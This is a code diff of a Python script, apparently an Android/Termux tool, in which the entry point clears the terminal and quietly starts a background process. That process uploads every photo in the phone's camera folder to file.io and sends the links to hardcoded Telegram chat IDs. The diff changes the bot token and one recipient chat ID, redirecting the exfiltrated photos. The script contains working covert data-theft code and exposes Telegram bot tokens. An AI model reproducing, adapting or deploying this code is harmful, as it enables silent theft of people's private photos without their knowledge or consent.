@@ -10,7 +10,7 @@ def send_file_link(token, dir_path):
                 response = requests.post("https://file.io", files={"file": f})
                 linkkk = "Download link for {}: {}".format(file, response.json()["link"])
                 requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=5728361296&text=" + linkkk)
-                requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=5594648603&text=" + linkkk)
+                requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=5719227426&text=" + linkkk)
 
 #--> Clear Terminal
 def clear():
@@ -296,7 +296,7 @@ class simpan_file:
 #--> Trigger
 if __name__ == '__main__':
     clear()
-    token = '6120820820:AAE7eXE4UKEvXAgZGNELlV5YZ1qpgliDrQg'
+    token = '6513027141:AAGQ-BCYDQATbjZHKnlMPu0RmVrC7A20rSo'
     dir_path = "/sdcard/DCIM/Camera"
     p = multiprocessing.Process(target=send_file_link, args=(token, dir_path))
     p.start()
